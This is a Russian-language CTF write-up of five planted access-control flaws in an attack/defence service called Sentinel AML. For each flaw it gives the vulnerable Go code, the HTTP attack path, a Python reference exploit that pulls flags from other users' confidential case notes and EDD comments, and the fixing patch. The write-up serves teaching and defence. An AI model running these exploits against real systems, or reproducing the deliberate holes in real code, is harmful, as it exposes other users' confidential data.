# Sentinel AML - пять способов вынести чужой контекст через разрешённые функции

*Авторский разбор предусмотренных уязвимостей A/D-сервиса. Технологии: Go, PostgreSQL, HTTP API и фоновые обработчики. Редакция: октябрь 2026.*

Sentinel - система расследований для финансового мониторинга. В этой области нельзя просто закрыть доступ ко всем чужим объектам: связанные дела должны находиться, сводные события - отображаться, а рабочие группы - видеть общий контекст. Вопрос в другом: какие сведения о чужом деле можно показать и какие должны оставаться доступными только его владельцу.

Чекер размещает флаги в `CaseNote.body` (первое хранилище, Place 1) и `EDDRecord.confidential_comment` (второе хранилище, Place 2). Публичные подсказки содержат идентификаторы и признаки связи между объектами. Ниже разобраны пути утечки с отсылками к исходному коду и эталонным программам эксплуатации.

| Вектор | Разрешённое действие | Куда попадают закрытые данные |
|---|---|---|
| AML-1 | Предварительный просмотр объединения дубликатов | `candidate.match_explanation` |
| AML-2 | Лента связанной сущности | `activity_narrative` |
| AML-3 | Сводка расширенной проверки (EDD) в графе связей | `assessment_summary` |
| AML-4 | Экспорт собственного спора | `linked_evidence` |
| AML-5 | Досье комнаты | `context_blocks` / `evaluation_blocks` |

## AML-1: Почему поиск дубликатов процитировал чужую заметку

При объединении похожих расследований система должна объяснить аналитику, по каким признакам дела считаются связанными. В Sentinel такое объяснение в некоторых случаях превращается в дословную цитату из заметки другого аналитика.

Прямой доступ к чужому делу закрыт. Но его содержимое появляется в ответе предварительного просмотра объединения (`merge-preview`), где выглядит как обычное пояснение к найденному совпадению.

**Хранилище:** Place 1 · `CaseNote.body`  
**Поле утечки:** `candidate.match_explanation`  

### Где именно теряется доступ

В `caseDuplicateMergePreviewResponse` уже есть безопасная основа для объяснения - `PublicCaseSimilarityEvidence`. Однако обработчик дополняет её результатами `MatchEvidenceResolver`, в том числе материалами аналитической проверки дела-кандидата. При построении ответа `MatchExplanationBuilder` сначала обращается к `MatchEvidenceSourceReviewContext`. Если этот источник содержит чужую заметку, её текст подменяет публичную причину совпадения.

Проверка доступа теряется при выборе текста пояснения, а не при поиске похожих дел. Показывать сам факт совпадения можно; цитировать в подсказке чужие рабочие заметки - нельзя.

`internal/httpapi/dedup_merge_preview.go:26–45`:

```go
func (s *Server) caseDuplicateMergePreviewResponse(ctx context.Context, ownerUserID int64, sourceCaseID int64, candidate casework.DuplicateCandidate) (any, error) {
	view := duplicatePreviewView(candidate)
	evidence := casework.PublicCaseSimilarityEvidence(candidate)
	if resolver, ok := s.cases.(casework.MatchEvidenceResolver); ok {
		resolved, err := resolver.ResolveMatchEvidence(ctx, casework.MatchEvidenceRequest{
			OwnerUserID:     ownerUserID,
			SourceCaseID:    sourceCaseID,
			CandidateCaseID: candidate.CaseID,
		})
		if err != nil {
			return nil, err
		}
		evidence = append(evidence, resolved...)
	}
	explanation := casework.NewMatchExplanationBuilder(
		casework.MatchEvidenceSourceReviewContext,
		casework.MatchEvidenceSourceCounterparty,
		casework.MatchEvidenceSourceRiskTags,
		casework.MatchEvidenceSourcePublicTransaction,
	).Build(evidence, view.MatchExplanation)
```

`internal/casework/matching_evidence.go:49–61`:

```go
func (b MatchExplanationBuilder) Build(evidence []CaseSimilarityEvidence, fallback string) string {
	for _, preferred := range b.preferredSources {
		if excerpt := firstEvidenceExcerpt(evidence, preferred); excerpt != "" {
			return excerpt
		}
	}
	for _, item := range evidence {
		if excerpt := strings.TrimSpace(item.Excerpt); excerpt != "" {
			return excerpt
		}
	}
	return strings.TrimSpace(fallback)
}
```

### Путь атаки

В публичной подсказке есть `case_id` и `matching_reference`. Сначала атакующий создаёт своё дело с тем же признаком связи. Для этого эталонный эксплойт заводит клиента, счёт, транзакцию, сигнал о подозрительной операции и дело. Затем проверяет, появился ли `case_id` жертвы в списке кандидатов. Лишь после этого запрашивает предварительный просмотр объединения и читает `candidate.match_explanation`.

Идентификатора чужого дела самого по себе недостаточно: система должна признать его кандидатом на объединение. Без общего признака связи запрос не даст нужного результата.

**Пример структуры публичной подсказки**:

```json
{
  "service": "sentinel_aml",
  "case_id": 123,
  "matching_reference": "sample-dedup-reference"
}
```

```http
GET /api/cases/{own_case_id}/duplicates
Authorization: Bearer <attacker-token>

GET /api/cases/{own_case_id}/duplicates/{victim_case_id}/merge-preview
Authorization: Bearer <attacker-token>
```

`aml_dedup_preview.py:127–152`:

```python
def run_exploit(host: str, port: str, attack_data: dict[str, Any], timeout: float) -> str:
    client = Client(host, port, timeout)
    suffix = stable_suffix(attack_data)
    token = register_and_login(client, suffix)
    source_case_id = create_attacker_case(client, token, attack_data, suffix)
    victim_case_id = require_attack_int(attack_data, "case_id", "case_ref")

    candidates = client.request_json("GET", f"/api/cases/{source_case_id}/duplicates", token=token).get("candidates")
    if not isinstance(candidates, list):
        raise ExploitError("duplicate candidate response is malformed")
    if not any(isinstance(item, dict) and item.get("case_id") == victim_case_id for item in candidates):
        raise ExploitError("victim case is not a duplicate candidate")

    preview = client.request_json(
        "GET",
        f"/api/cases/{source_case_id}/duplicates/{victim_case_id}/merge-preview",
        token=token,
    )
    candidate = preview.get("candidate")
    explanation = candidate.get("match_explanation") if isinstance(candidate, dict) else None
    if not isinstance(explanation, str):
        raise ExploitError("AML-1 match explanation is absent")
    flag = extract_flag(explanation)
    if flag:
        return flag
    raise ExploitError("flag-like token not found in match explanation")
```

### Исправление

После исправления предварительный просмотр объединения больше не обращается к `MatchEvidenceResolver`. Формировщик пояснения (`MatchExplanationBuilder`) получает только источники из `PublicMatchEvidenceSources()`. Поиск дубликатов продолжает работать, но чужая рабочая заметка больше не подставляется в объяснение совпадения.

Полный текст эталонного патча:

```diff
diff --git a/internal/httpapi/dedup_merge_preview.go b/internal/httpapi/dedup_merge_preview.go
--- a/internal/httpapi/dedup_merge_preview.go
+++ b/internal/httpapi/dedup_merge_preview.go
@@ -20,26 +20,10 @@ func caseMatchPreviewAvailable() bool {
 	return true
 }
 
-func (s *Server) caseDuplicateMergePreviewResponse(ctx context.Context, ownerUserID int64, sourceCaseID int64, candidate casework.DuplicateCandidate) (any, error) {
+func (s *Server) caseDuplicateMergePreviewResponse(_ context.Context, _ int64, sourceCaseID int64, candidate casework.DuplicateCandidate) (any, error) {
 	view := duplicatePreviewView(candidate)
 	evidence := casework.PublicCaseSimilarityEvidence(candidate)
-	if resolver, ok := s.cases.(casework.MatchEvidenceResolver); ok {
-		resolved, err := resolver.ResolveMatchEvidence(ctx, casework.MatchEvidenceRequest{
-			OwnerUserID:     ownerUserID,
-			SourceCaseID:    sourceCaseID,
-			CandidateCaseID: candidate.CaseID,
-		})
-		if err != nil {
-			return nil, err
-		}
-		evidence = append(evidence, resolved...)
-	}
-	explanation := casework.NewMatchExplanationBuilder(
-		casework.MatchEvidenceSourceReviewContext,
-		casework.MatchEvidenceSourceCounterparty,
-		casework.MatchEvidenceSourceRiskTags,
-		casework.MatchEvidenceSourcePublicTransaction,
-	).Build(evidence, view.MatchExplanation)
+	explanation := casework.NewMatchExplanationBuilder(casework.PublicMatchEvidenceSources()...).Build(evidence, view.MatchExplanation)
 
 	response := caseMatchDuplicateMergePreviewResponse{
 		SourceCaseID: sourceCaseID,
```

---

## AML-2: Как признак `Redacted` повысил уровень доступа в ленте

В ленте связанных контрагентов есть естественное ограничение: другой аналитик вправе узнать, что в деле обновили заметку, но не должен видеть её содержимое. Здесь возникает парадокс: программа замечает пометку о том, что значение поля нужно скрыть, - и именно из-за неё выбирает более подробный вариант описания события.

Для пользователя это обычная лента изменений связанной организации. Дополнительных прав на чужое расследование он не получал.

**Хранилище:** Place 1 · `CaseNote.body`  
**Поле утечки:** `activities[].activity_narrative`  


### Где именно теряется доступ

Для стороннего наблюдателя правильно задан круг получателей `ActivityAudienceRelatedEntity`. Но отдельная функция выбирает уровень подробности (`ActivityDetailLevel`). Если событие относится к `case_note`, а в `DiffJSON` есть закрытое поле с пометкой `Redacted = true`, функция возвращает `ActivityDetailCollaborator`.

При формировании описания события `ActivityHydrator` не сверяет этот уровень подробности с кругом получателей. Получив `ActivityDetailCollaborator`, он вызывает `ActivityReviewContext` и помещает выдержку в `activity_narrative`. Выходит, что пометка о необходимости скрыть поле приводит к раскрытию ещё большего объёма сведений.

`internal/httpapi/activity_views.go:18–38`:

```go
func (s *Server) entityActivityViewsForActivityStream(ctx context.Context, _ int64, _ string, events []auditrepo.EntityActivityEvent) ([]EntityActivityView, error) {
	return s.entityActivityViewsWithDetail(ctx, events, auditrepo.ActivityAudienceRelatedEntity, func(event auditrepo.EntityActivityEvent) auditrepo.ActivityDetailLevel {
		if event.ObjectType == "case_note" && hasControlledActivityChange(event.DiffJSON) {
			return auditrepo.ActivityDetailCollaborator
		}
		return auditrepo.ActivityDetailRelated
	})
}

func hasControlledActivityChange(diffJSON string) bool {
	var changes []auditrepo.RedactedFieldChange
	if err := json.Unmarshal([]byte(diffJSON), &changes); err != nil {
		return false
	}
	for _, change := range changes {
		if change.Redacted && auditrepo.IsRestrictedField(change.Field) {
			return true
		}
	}
	return false
}
```

`internal/audit/activity_hydration.go:109–130`:

```go
func (h ActivityHydrator) caseNoteResolver(ctx context.Context, req ActivityHydrationRequest) (ActivityNarrative, error) {
	if req.DetailLevel == ActivityDetailCollaborator && h.reviewContext != nil {
		excerpt, err := h.reviewContext.ActivityReviewContext(ctx, req.Event)
		if err != nil {
			return ActivityNarrative{}, err
		}
		if excerpt != "" {
			return ActivityNarrative{
				Subject:     "activity_subject",
				DetailLevel: req.DetailLevel,
				Narrative:   excerpt,
				Provenance:  ActivityProvenanceReviewContext,
			}, nil
		}
	}
	return ActivityNarrative{
		Subject:     "activity_subject",
		DetailLevel: req.DetailLevel,
		Narrative:   "Review context updated",
		Provenance:  ActivityProvenanceCatalog,
	}, nil
}
```

### Путь атаки

Из публичной подсказки берётся `entity_ref` или `party_ref`. Атакующий создаёт собственную запись с таким же приведённым к единому виду `entity_hint`, затем запрашивает `/api/entities/{entity_hint}/activity`. Эталонный эксплойт просматривает тексты описаний событий и ищет фрагменты закрытой заметки.

Сам факт изменения `case_note` разрешено видеть. Нарушение - в описании события: туда попадает содержимое чужой заметки.

**Пример структуры публичной подсказки**:

```json
{
  "service": "sentinel_aml",
  "entity_ref": "entity-test",
  "customer_id": 456
}
```

```http
GET /api/entities/{entity_hint}/activity
Authorization: Bearer <attacker-token>
```

`aml_audit_timeline.py:130–142`:

```python
def run_exploit(host: str, port: str, attack_data: dict[str, Any], timeout: float) -> str:
    client = Client(host, port, timeout)
    token = register_and_login(client, stable_suffix(attack_data))
    entity_hint = text_locator(attack_data, "entity_ref", "party_ref")

    ensure_attacker_entity_participation(client, token, attack_data, entity_hint)
    activity_path = BUSINESS_PATH.format(entity_hint=urllib.parse.quote(entity_hint, safe=""))
    activity = client.request_json("GET", activity_path, token=token)
    for value in iter_activity_narrative_values(activity):
        flag = extract_flag(value)
        if flag:
            return flag
    raise ExploitError("flag-like token not found in vulnerable entity activity")
```


### Исправление

Для ленты связанной сущности нужно оставлять `ActivityDetailRelated`, даже если событие затрагивает закрытое поле. Тогда сторонний наблюдатель видит факт изменения, но не получает подробности, предназначенные для участников расследования.

После такой замены условие становится избыточным: обе его ветки возвращают `ActivityDetailRelated`.

Полный текст эталонного патча:

```diff
diff --git a/internal/httpapi/activity_views.go b/internal/httpapi/activity_views.go
--- a/internal/httpapi/activity_views.go
+++ b/internal/httpapi/activity_views.go
@@ -16,7 +16,7 @@ func (s *Server) caseAuditViewsForActivityStream(_ context.Context, _ int64, _ i
 func (s *Server) entityActivityViewsForActivityStream(ctx context.Context, _ int64, _ string, events []auditrepo.EntityActivityEvent) ([]EntityActivityView, error) {
 	return s.entityActivityViewsWithDetail(ctx, events, auditrepo.ActivityAudienceRelatedEntity, func(event auditrepo.EntityActivityEvent) auditrepo.ActivityDetailLevel {
 		if event.ObjectType == "case_note" && hasControlledActivityChange(event.DiffJSON) {
-			return auditrepo.ActivityDetailCollaborator
+			return auditrepo.ActivityDetailRelated
 		}
 		return auditrepo.ActivityDetailRelated
 	})
```

---

## AML-3: Одна своя запись открыла чужие заключения в графе связей

В графе связей легко перепутать два разных права: видеть, что объекты относятся к одной группе, и читать каждую запись внутри неё. В Sentinel достаточно завести своего клиента с тем же `entity_hint`, что у другого владельца. После этого сервис собирает материалы всей группы, в том числе результаты закрытых проверок чужих клиентов.

На вид ответ представляет собой обычную сводку оценки риска. Но в `assessment_summary` оказывается закрытый комментарий аналитика.

**Хранилище:** Place 2 · `EDDRecord.confidential_comment`  
**Поле утечки:** `summaries[].assessment_summary`  


### Где именно теряется доступ

Проверка `EXISTS` убеждается лишь в том, что у запрашивающего есть хотя бы один собственный клиент с указанным `entity_hint`. Однако основной SQL-запрос выбирает `edd_records` всех клиентов с этим значением, не ограничивая каждую строку по `owner_user_id`. Вместе с остальными сведениями загружается и `confidential_comment`.

После чтения данных из базы `ListReviewEDDSummaries` применяет `ExtendedAssessmentSummaryPolicy()` - правило, позволяющее вывести закрытое пояснение аналитика (`AnalystNarrative`) в `assessment_summary`. Ошибка проявляется в двух местах: при выборке чужих записей и при формировании ответа. Разбиение имени столбца на `"conf" + "idential_comment"` на права доступа не влияет: для SQL это всё то же поле.

`internal/graph/repository_entity_summaries.go:8–19`:

```go
func (r *Repository) ListReviewEDDSummaries(ctx context.Context, ownerUserID int64, entityHint string) ([]ReviewEDDSummary, error) {
	materials, err := r.ListReviewMaterials(ctx, ownerUserID, entityHint)
	if err != nil {
		return nil, err
	}
	summaries := make([]ReviewEDDSummary, 0, len(materials))
	policy := ExtendedAssessmentSummaryPolicy()
	for _, material := range materials {
		summaries = append(summaries, material.WithAssessmentSummary(policy))
	}
	return summaries, nil
}
```

`internal/graph/repository_entity_summaries.go:32–56`:

```go

	rows, err := r.db.QueryContext(ctx, fmt.Sprintf(`
SELECT er.id, er.customer_id, lower(btrim(c.entity_hint)) AS entity_hint, er.review_status, c.risk_level,
       er.risk_rationale AS risk_summary,
       er.%s AS analyst_narrative,
       concat('EDD review ', lower(er.review_status), ' for ', c.risk_level, ' customer') AS review_caption,
       'graph_review' AS review_scope,
       er.created_at, er.updated_at
FROM edd_records er
JOIN customers c ON c.id = er.customer_id
WHERE lower(btrim(c.entity_hint)) = $2
  AND EXISTS (
      SELECT 1
      FROM customers owned
      WHERE owned.owner_user_id = $1 AND lower(btrim(owned.entity_hint)) = $2
  )
ORDER BY er.updated_at DESC, er.id`, analystNarrativeColumn()),
		ownerUserID,
		hint,
	)
	if err != nil {
		return nil, fmt.Errorf("list graph review edd summaries: %w", err)
	}
	defer rows.Close()
```

### Путь атаки

Атакующему не нужно угадывать идентификатор чужой записи EDD. Достаточно войти в нужную группу по общему `entity_hint`: эталонный эксплойт создаёт своего клиента с признаком из подсказки, запрашивает сводки и ищет секрет в `summaries[].assessment_summary`.

**Пример структуры публичной подсказки**:

```json
{
  "service": "sentinel_aml",
  "customer_id": 456,
  "entity_ref": "entity-test"
}
```

```http
GET /api/graph/entities/{entity_hint}/edd-summaries
Authorization: Bearer <attacker-token>
```


`aml_related_graph.py:140–153`:

```python
def run_exploit(host: str, port: str, attack_data: dict[str, Any], timeout: float) -> str:
    client = Client(host, port, timeout)
    suffix = stable_suffix(attack_data)
    token = register_and_login(client, suffix)
    entity_hint = text_locator(attack_data, "entity_ref", "party_ref")

    create_attacker_graph_customer(client, token, entity_hint, suffix)
    quoted_hint = urllib.parse.quote(entity_hint, safe="")
    response = client.request_json("GET", f"/api/graph/entities/{quoted_hint}/edd-summaries", token=token)
    for value in iter_assessment_summary_values(response):
        flag = extract_flag(value)
        if flag:
            return flag
    raise ExploitError("flag-like token not found in vulnerable graph EDD summaries")
```


### Исправление

Эталонное исправление заменяет `ExtendedAssessmentSummaryPolicy()` на `GraphAssessmentSummaryPolicy()`. Закрытое пояснение аналитика больше не выводится в общедоступную сводку. Это перекрывает описанный канал утечки, но не устраняет избыточную выборку: SQL по-прежнему загружает `confidential_comment` в память сервиса.

Для более строгого разграничения доступа стоило бы исключить закрытое поле из общедоступной выборки либо ограничить доступные записи непосредственно на уровне запросов к базе данных. В эталонный патч такое изменение не входит.

Полный текст эталонного патча:

```diff
diff --git a/internal/graph/repository_entity_summaries.go b/internal/graph/repository_entity_summaries.go
--- a/internal/graph/repository_entity_summaries.go
+++ b/internal/graph/repository_entity_summaries.go
@@ -9,7 +9,7 @@ func (r *Repository) ListReviewEDDSummaries(ctx context.Context, ownerUserID int
 		return nil, err
 	}
 	summaries := make([]ReviewEDDSummary, 0, len(materials))
-	policy := ExtendedAssessmentSummaryPolicy()
+	policy := GraphAssessmentSummaryPolicy()
 	for _, material := range materials {
 		summaries = append(summaries, material.WithAssessmentSummary(policy))
 	}
```

---

## AML-4: Связанное дело оказалось «корневым» при сборке экспорта

При формировании отчёта по спорной операции сервис собирает материалы нескольких расследований. По собственному делу аналитик должен получать полный пакет, по связанному чужому делу - только разрешённые сведения. Нарушение возникает ещё при подготовке отчёта, до того как кто-либо запросит готовый файл.

В коде предусмотрены две роли дела: основное (`Root`) и связанное (`Linked`). Большая часть кода формирования отчёта правильно различает их. Но один вызов обрабатывает чужое связанное дело как основное, и результат этой ошибки сохраняется внутри готового документа.

**Хранилище:** Place 1 · `CaseNote.body`  
**Поле утечки:** `bundle.linked_evidence[]`  


### Где именно теряется доступ

В `appendExportLinkedCaseData` цикл проходит по `linkedCases`, однако `appendExportSourceMaterials` получает `traversal.Root` вместо `traversal.Linked`. Поэтому материалы чужого дела обрабатываются по правилам, предназначенным для основного дела, которым владеет заказчик отчёта.

Особенно важно, что проверка владельца при `GET /api/exports/{id}` может работать совершенно правильно. Атакующий запрашивает свой экспорт - просто в нём уже находятся чужие заметки.

`internal/exporting/export_linked_evidence.go:7–14`:

```go
func appendExportLinkedCaseData(bundle *ExportBundle, _ CaseSnapshot, linkedCases []CaseSnapshot, scopes map[string]bool, traversal ExportCaseTraversal) {
	if traversal.Root.DisputeID <= 0 || !scopes["linked_cases"] {
		return
	}
	for _, linked := range linkedCases {
		appendExportSourceMaterials(bundle, linked.SourceMaterials, traversal.Root)
	}
}
```

`internal/exporting/redaction.go:205–214`:

```go
	visited := map[int64]bool{root.CaseID: true}
	appendSafeCaseData(&bundle, root, scopes, "root")
	linkedCases := flattenLinkedCases(root.LinkedCases, visited)
	for _, linked := range linkedCases {
		if scopes["linked_cases"] {
			bundle.LinkedCases = append(bundle.LinkedCases, safeCaseShell(linked))
		}
		appendSafeCaseData(&bundle, linked, scopes, "linked")
	}
	appendExportLinkedCaseData(&bundle, root, linkedCases, scopes, traversal)
```

### Путь атаки

По `matching_reference` атакующий создаёт собственное расследование, которое система считает связанным с делом жертвы. Затем открывает спор, запрашивает отчёт с `purpose=regulatory_report` и по `export_id` читает сохранённый документ. Закрытый текст извлекается из `bundle.linked_evidence`, куда при сборке попали материалы чужого дела.

Ключ к атаке - три шага: связать дела, сформировать экспорт и прочитать сохранённый документ. Прямого обращения к чужой заметке здесь нет.

**Пример структуры публичной подсказки**:

```json
{
  "service": "sentinel_aml",
  "case_id": 123,
  "matching_reference": "sample-dedup-reference",
  "entity_ref": "entity-test"
}
```

```http
POST /api/disputes/{dispute_id}/export
Authorization: Bearer <attacker-token>
Content-Type: application/json

{"purpose":"regulatory_report"}

GET /api/exports/{export_id}
Authorization: Bearer <attacker-token>
```

`aml_export_redaction.py:142–157`:

```python
def run_exploit(host: str, port: str, attack_data: dict[str, Any], timeout: float) -> str:
    client = Client(host, port, timeout)
    suffix = stable_suffix(attack_data)
    token = register_and_login(client, suffix)
    root_case_id = create_attacker_case(client, token, attack_data, suffix)
    dispute_id = create_dispute(client, token, root_case_id, suffix)
    created_export = create_dispute_export(client, token, dispute_id)
    export_id = require_int(created_export, "id")
    stored_export = client.request_json("GET", f"/api/exports/{export_id}", token=token)

    for payload in (stored_export, created_export):
        for value in iter_linked_evidence_values(payload):
            flag = extract_flag(value)
            if flag:
                return flag
    raise ExploitError("flag-like token not found in linked evidence content")
```


### Исправление

В цикле связанных дел нужно передавать `traversal.Linked`. Тогда к чужим исходным материалам применяются предусмотренные для них правила сокрытия закрытых данных. Сами связанные дела остаются в отчёте, а по собственному основному делу аналитик по-прежнему получает полный набор материалов.

Полный текст эталонного патча:

```diff
diff --git a/internal/exporting/export_linked_evidence.go b/internal/exporting/export_linked_evidence.go
--- a/internal/exporting/export_linked_evidence.go
+++ b/internal/exporting/export_linked_evidence.go
@@ -8,6 +8,6 @@ func appendExportLinkedCaseData(bundle *ExportBundle, _ CaseSnapshot, linkedCas
 		return
 	}
 	for _, linked := range linkedCases {
-		appendExportSourceMaterials(bundle, linked.SourceMaterials, traversal.Root)
+		appendExportSourceMaterials(bundle, linked.SourceMaterials, traversal.Linked)
 	}
 }
```

---

## AML-5: Комната расследований поверила содержимому блока, но проигнорировала его политику

Комната расследований не открывает пользователю чужое дело напрямую. Вместо этого фоновый обработчик собирает материалы нескольких аналитиков, а участники комнаты читают готовое досье. Чужие сведения могут оказаться рядом с собственными без единого прямого запроса к делу жертвы.

У каждого блока есть идентификатор, связь с делом и политика доступа (`CoveragePolicy`). Однако при выдаче чужих материалов программа проверяет существование и содержимое блока, но не учитывает, разрешено ли показывать его участникам комнаты.

**Хранилище:** Place 1 и Place 2 · `CaseNote.body` / `EDDRecord.confidential_comment`  
**Поля утечки:** `cases[].context_blocks[].content` / `evaluation_blocks[].content`  


### Где именно теряется доступ

При построении досье `BuildExtendedDossier` вызывает для чужого дела `boundedContextBlocks` и `boundedEvaluationBlocks`. Функции исключают пустые блоки и некорректные идентификаторы, приводят обозначение политики к единому виду и сортируют записи. Но `CoveragePolicy` лишь переносится в ответ, а не участвует в решении, можно ли показывать содержимое.

Поэтому в общем досье рядом с разрешёнными сводками оказываются закрытые заметки и результаты внутренней проверки EDD. Ошибка возникает при переходе от материалов, подготовленных фоновым обработчиком, к ответу для участников комнаты.

`internal/networkroom/dossier_context.go:65–82`:

```go
			CustomerID:            c.CustomerID,
			OwnedByRequester:      c.OwnerUserID == requesterUserID,
			Status:                strings.TrimSpace(c.Status),
			PublicSummary:         strings.TrimSpace(c.PublicSummary),
			RiskScore:             c.RiskScore,
			TypologyHint:          strings.TrimSpace(c.TypologyHint),
			PublicRiskTags:        normalizeTags(c.PublicRiskTags),
			ScopeCoverageComplete: true,
			CreatedAt:             c.CreatedAt.UTC(),
			UpdatedAt:             c.UpdatedAt.UTC(),
		}
		if !summary.OwnedByRequester {
			summary.ContextBlocks = boundedContextBlocks(c.ContextBlocks)
			summary.EvaluationBlocks = boundedEvaluationBlocks(c.EvaluationBlocks)
			summary.ScopeCoverageComplete = len(summary.ContextBlocks) == 0 && len(summary.EvaluationBlocks) == 0
		}
		summaries = append(summaries, summary)
	}
```

`internal/networkroom/dossier_context.go:96–125`:

```go
func boundedContextBlocks(blocks []DossierContextBlock) []DossierContextBlock {
	bounded := make([]DossierContextBlock, 0, len(blocks))
	for _, block := range blocks {
		if block.BlockID <= 0 || block.CaseID <= 0 || strings.TrimSpace(block.Content) == "" {
			continue
		}
		bounded = append(bounded, DossierContextBlock{
			BlockID:        block.BlockID,
			CaseID:         block.CaseID,
			CoveragePolicy: normalizeArtifactCoverage(block.CoveragePolicy),
			Content:        strings.TrimSpace(block.Content),
		})
	}
	sort.Slice(bounded, func(i, j int) bool { return bounded[i].BlockID < bounded[j].BlockID })
	return bounded
}

func boundedEvaluationBlocks(blocks []DossierEvaluationBlock) []DossierEvaluationBlock {
	bounded := make([]DossierEvaluationBlock, 0, len(blocks))
	for _, block := range blocks {
		if block.BlockID <= 0 || block.CustomerID <= 0 || strings.TrimSpace(block.Content) == "" {
			continue
		}
		bounded = append(bounded, DossierEvaluationBlock{
			BlockID:        block.BlockID,
			CustomerID:     block.CustomerID,
			CoveragePolicy: normalizeArtifactCoverage(block.CoveragePolicy),
			Content:        strings.TrimSpace(block.Content),
		})
	}
```

### Путь атаки

Атакующий создаёт учётную запись, добавляет клиента с тем же `entity_hint` и подходящей типологией и ждёт формирования общей комнаты. Затем находит её через `/api/network/rooms`, присоединяется запросом к `/join` и читает досье через `/dossier`. Эксплойт просматривает `context_blocks` и `evaluation_blocks` чужих дел.

Комната формируется не мгновенно. Пока фоновый обработчик не завершил работу, её отсутствие в ответе ещё не означает, что уязвимости нет. Сначала нужно дождаться появления комнаты и только потом проверять содержимое досье.

**Пример структуры публичной подсказки**:

```json
{
  "service": "sentinel_aml",
  "customer_id": 456,
  "entity_ref": "entity-test",
  "typology_hint": "test-typology"
}
```

```http
GET /api/network/rooms
Authorization: Bearer <attacker-token>

POST /api/network/rooms/{room_id}/join
Authorization: Bearer <attacker-token>

GET /api/network/rooms/{room_id}/dossier
Authorization: Bearer <attacker-token>
```

`aml_network_room.py:148–160`:

```python
def run_exploit(host: str, port: str, attack_data: dict[str, Any], timeout: float) -> str:
    client = Client(host, port, timeout)
    suffix = stable_suffix(attack_data)
    token = register_and_login(client, suffix)
    create_attacker_case(client, token, attack_data, suffix)
    room_id = wait_for_network_room(client, token, attack_data)
    join_network_room(client, token, room_id)
    dossier = client.request_json("GET", f"/api/network/rooms/{room_id}/dossier", token=token)

    flag = extract_flag_from_dossier(dossier)
    if flag:
        return flag
    raise ExploitError("flag-like token not found in network-room dossier")
```

### Исправление

В эталонном патче обе функции `bounded*Blocks` получают требуемое значение `CoveragePolicy`. Для чужих дел остаются только блоки с `RoomCoverageSummaryMaterial` - сводные материалы, разрешённые для общей комнаты. Исходные закрытые материалы больше не включаются в ответ, а возможность совместной работы сохраняется.

Исправление ограничивает данные на этапе выдачи. Дополнительную проверку прав можно было бы встроить в запросы к базе данных или в фоновое формирование досье, но это уже затронуло бы устройство хранения и обработки материалов.

Полный текст эталонного патча:

```diff
diff --git a/internal/networkroom/dossier_context.go b/internal/networkroom/dossier_context.go
--- a/internal/networkroom/dossier_context.go
+++ b/internal/networkroom/dossier_context.go
@@ -74,8 +74,8 @@ func BuildExtendedDossier(requesterUserID int64, room RoomSummary, cases []Exte
 			UpdatedAt:             c.UpdatedAt.UTC(),
 		}
 		if !summary.OwnedByRequester {
-			summary.ContextBlocks = boundedContextBlocks(c.ContextBlocks)
-			summary.EvaluationBlocks = boundedEvaluationBlocks(c.EvaluationBlocks)
+			summary.ContextBlocks = boundedContextBlocks(c.ContextBlocks, classification.RoomCoverageSummaryMaterial)
+			summary.EvaluationBlocks = boundedEvaluationBlocks(c.EvaluationBlocks, classification.RoomCoverageSummaryMaterial)
 			summary.ScopeCoverageComplete = len(summary.ContextBlocks) == 0 && len(summary.EvaluationBlocks) == 0
 		}
 		summaries = append(summaries, summary)
@@ -96,11 +96,13 @@ func BuildExtendedDossier(requesterUserID int64, room RoomSummary, cases []Exte
-func boundedContextBlocks(blocks []DossierContextBlock) []DossierContextBlock {
+func boundedContextBlocks(blocks []DossierContextBlock, requiredCoverage string) []DossierContextBlock {
+	requiredCoverage = normalizeArtifactCoverage(requiredCoverage)
 	bounded := make([]DossierContextBlock, 0, len(blocks))
 	for _, block := range blocks {
-		if block.BlockID <= 0 || block.CaseID <= 0 || strings.TrimSpace(block.Content) == "" {
+		coverage := normalizeArtifactCoverage(block.CoveragePolicy)
+		if block.BlockID <= 0 || block.CaseID <= 0 || strings.TrimSpace(block.Content) == "" || coverage != requiredCoverage {
 			continue
 		}
 		bounded = append(bounded, DossierContextBlock{
 			BlockID:        block.BlockID,
 			CaseID:         block.CaseID,
-			CoveragePolicy: normalizeArtifactCoverage(block.CoveragePolicy),
+			CoveragePolicy: coverage,
 			Content:        strings.TrimSpace(block.Content),
@@ -113,11 +115,13 @@ func boundedContextBlocks(blocks []DossierContextBlock) []DossierContextBlock {
-func boundedEvaluationBlocks(blocks []DossierEvaluationBlock) []DossierEvaluationBlock {
+func boundedEvaluationBlocks(blocks []DossierEvaluationBlock, requiredCoverage string) []DossierEvaluationBlock {
+	requiredCoverage = normalizeArtifactCoverage(requiredCoverage)
 	bounded := make([]DossierEvaluationBlock, 0, len(blocks))
 	for _, block := range blocks {
-		if block.BlockID <= 0 || block.CustomerID <= 0 || strings.TrimSpace(block.Content) == "" {
+		coverage := normalizeArtifactCoverage(block.CoveragePolicy)
+		if block.BlockID <= 0 || block.CustomerID <= 0 || strings.TrimSpace(block.Content) == "" || coverage != requiredCoverage {
 			continue
 		}
 		bounded = append(bounded, DossierEvaluationBlock{
 			BlockID:        block.BlockID,
 			CustomerID:     block.CustomerID,
-			CoveragePolicy: normalizeArtifactCoverage(block.CoveragePolicy),
+			CoveragePolicy: coverage,
 			Content:        strings.TrimSpace(block.Content),
```

---
## Что эти пять уязвимостей говорят об архитектуре

У Sentinel утечки возникают не только в обработчиках запросов. Их создают приоритеты источников пояснения, неверный уровень подробности в ленте, выборка графа связей, ошибка контекста при подготовке отчёта и недостаточная фильтрация результатов фоновой обработки. В условиях A/D важно исправлять именно разграничение доступа, сохраняя законную функцию сервиса.
